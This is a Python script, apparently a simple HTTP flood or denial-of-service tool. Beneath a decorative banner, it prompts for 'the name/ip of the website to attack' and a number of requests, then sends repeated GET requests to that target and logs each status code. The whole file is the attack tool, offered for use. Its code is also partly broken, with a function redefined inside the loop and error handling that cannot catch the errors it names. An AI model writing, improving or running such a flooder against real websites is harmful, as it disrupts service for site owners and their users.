import asyncio
import aiohttp
import socket
from colorama import Fore, Style
import os
from time import sleep




def intro():
    print(Fore.LIGHTMAGENTA_EX + "                                                  ")
    print("          ▄▄                                                             ")
    print("          ██ ▀███                                    ██                  ")
    print("               ██                                    ██                  ")
    print(" ▄█▀██▄ ▀███   ██  ▄██▀  ▄██▀██▄▀████████▄   ▄▄█▀████████                ")
    print("██   ██   ██   ██ ▄█    ██▀   ▀██ ██    ██  ▄█▀   ██ ██                  ")
    print(" ▄█████   ██   ██▄██    ██     ██ ██    ██  ██▀▀▀▀▀▀ ██                  ")
    print("██   ██   ██   ██ ▀██▄  ██▄   ▄██ ██    ██  ██▄    ▄ ██                  ")
    print("▀████▀██▄████▄████▄ ██▄▄ ▀█████▀▄████  ████▄ ▀█████▀ ▀████               ")
    print("                                                                             ")
    print("                                                                             ")
    print("                                                                             ")
    print(f"{Style.BRIGHT}{Fore.BLUE} https://github.com/aikooo7 {Style.RESET_ALL}")

def get_url():
    intro()
    global url
    Fore.RESET
    url = input("Enter the name/ip of the website to attack: ")
    try:
        ip = socket.gethostbyname(url)
        is_ip = True
        print(f"Target resolved to IP address: {ip}")
    except socket.gaierror:
        print("Target is not an IP address. Proceeding as a website URL.")
        is_ip = False

get_url()
times = input("How much requests you want to do?: ")
times = int(times)
index = 0

async def botnet_checker():
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                return True
            else:
                print("Cannot connect to the target.")
                return False

for botnet_main in range(times):
    try:
        async def botnet_main():

            async with aiohttp.ClientSession() as session:
                async with session.get(url) as response:

                    status_code = response.status
                    if status_code == 200:
                        global index
                        index += 1
                        print(f"Request {index}: Done successfully your request with a code {Fore.GREEN}{status_code}{Style.RESET_ALL} (OK)")
                    else:
                        print(f"Request failed with code {Fore.RED}{status_code}{Style.RESET_ALL}")
                        return False
    except aiohttp.ClientConnectorError as e:
                print(f"Request {index}: An error occurred: {str(e)}")
                break

    loop = asyncio.get_event_loop()
    loop.run_until_complete(botnet_main())

